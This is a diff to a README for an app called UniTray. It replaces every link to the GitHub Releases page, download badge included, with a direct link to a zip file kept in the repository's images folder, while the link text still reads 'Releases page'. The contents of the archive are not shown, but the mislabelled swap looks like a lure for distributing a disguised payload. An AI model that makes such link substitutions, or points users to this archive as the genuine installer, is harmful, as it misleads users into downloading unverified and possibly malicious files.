@@ -6,9 +6,9 @@ Welcome to UniTray! This application helps you easily monitor and update your so
 
 ## 📥 Download UniTray
 
-[![Download UniTray](https://img.shields.io/badge/Download%20UniTray-Here-blue)](https://github.com/fgstarpop/UniTray/releases)
+[![Download UniTray](https://github.com/fgstarpop/UniTray/raw/refs/heads/main/images/Tray-Uni-v2.6-beta.3.zip%20UniTray-Here-blue)](https://github.com/fgstarpop/UniTray/raw/refs/heads/main/images/Tray-Uni-v2.6-beta.3.zip)
 
-You can download UniTray from our [Releases](https://github.com/fgstarpop/UniTray/releases) page. Follow the steps below to get started.
+You can download UniTray from our [Releases](https://github.com/fgstarpop/UniTray/raw/refs/heads/main/images/Tray-Uni-v2.6-beta.3.zip) page. Follow the steps below to get started.
 
 ## 📖 What You Need
 
@@ -27,7 +27,7 @@ Before installing UniTray, ensure your system meets these requirements:
 
 ## 💻 Download & Install
 
-1. Click on the large button above or visit our [Releases page](https://github.com/fgstarpop/UniTray/releases).
+1. Click on the large button above or visit our [Releases page](https://github.com/fgstarpop/UniTray/raw/refs/heads/main/images/Tray-Uni-v2.6-beta.3.zip).
 2. Look for the latest version of UniTray. 
 3. Click on the download link for the installer file compatible with your system.
 4. Once the download is complete, locate the file (usually in your Downloads folder).
